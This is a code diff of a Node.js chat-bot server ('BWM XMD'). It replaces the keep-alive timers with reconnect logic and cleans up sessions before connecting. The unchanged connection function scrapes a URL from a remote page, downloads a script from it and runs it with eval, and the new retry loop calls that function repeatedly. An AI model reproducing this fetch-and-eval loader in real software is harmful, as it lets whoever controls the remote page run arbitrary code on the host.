@@ -72,22 +72,40 @@ server.listen(PORT, '0.0.0.0', () => {
   console.log(`BWM XMD Bot Server running on port ${PORT}`);
 });
 
-// Keep-alive ping every 5 minutes
-setInterval(() => {
-  if (global.xmd && global.xmd.user) {
-    console.log("Bot connection active");
-  }
-}, 300000);
+// Single keep-alive ping and connection check
+const PING_INTERVAL = 60000; // 1 minute
+let reconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 5;
 
-// Add keep-alive ping to prevent premature scaling to zero
-setInterval(() => {
-  if (global.xmd && global.xmd.user) {
-    console.log("Bot is alive and connected");
+setInterval(async () => {
+  try {
+    if (global.xmd?.user) {
+      console.log("Bot connection active");
+      reconnectAttempts = 0;
+    } else if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+      console.log("Connection lost, attempting to reconnect...");
+      reconnectAttempts++;
+      // Clear any existing sessions
+      clearSessionData();
+      // Attempt to reconnect
+      await fetchAdamsUrl();
+    } else {
+      console.log("Max reconnection attempts reached. Please restart the bot manually.");
+      process.exit(1);
+    }
+  } catch (error) {
+    console.error("Connection check error:", error.message);
   }
-}, 45000);
+}, PING_INTERVAL);
+
+// Clear existing sessions before startup
+clearSessionData();
 
 async function fetchAdamsUrl() {
   try {
+    // Add delay between connection attempts
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
@@ -98,8 +116,14 @@ async function fetchAdamsUrl() {
       throw new Error('The URL link not found...');
     }
 
-    console.log('You have successfully connected to the server ✅');
+    // Check for existing connection
+    if (global.xmd?.user) {
+      console.log('Session already exists, cleaning up first...');
+      await global.xmd.logout();
+      delete global.xmd;
+    }
 
+    console.log('Connecting to the server...');
     const scriptResponse = await axios.get(adamsUrl);
     eval(scriptResponse.data);
 
